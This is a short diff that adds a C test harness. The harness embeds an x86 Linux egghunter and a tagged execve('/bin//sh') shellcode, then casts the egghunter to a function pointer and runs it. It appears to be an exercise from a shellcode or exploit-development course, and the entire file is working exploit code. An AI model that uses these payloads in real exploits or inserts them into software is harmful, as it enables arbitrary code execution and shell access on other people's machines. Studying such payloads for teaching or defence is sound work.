@@ -1,0 +1,28 @@
+#include<stdio.h>
+#include<string.h>
+
+
+unsigned char shellcode[] = \
+"\xDD\xCC\xBB\xAA" //tag in reverse
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+;
+
+
+unsigned char egghunter[] =
+"\xeb\x1d\x5f\x83\xef\x24\xb8\xdd\xcc\xbb\xaa\x31\xc9\x66\xb9\xff\xff\xfd\xaf\x74\x05\x83\xc7\x03\xe2\xf8\x83\xc7\x08\xff\xe7\xe8\xde\xff\xff\xff"
+;
+
+
+main()
+{
+
+        printf("Egghunter Length:  %d\n", strlen(egghunter));
+	printf("Shellcode Length:  %d\n", strlen(shellcode));
+
+	int (*ret)() = (int(*)())egghunter;
+//	int (*ret)() = (int(*)())shellcode+4;
+	ret();
+
+}
+
+
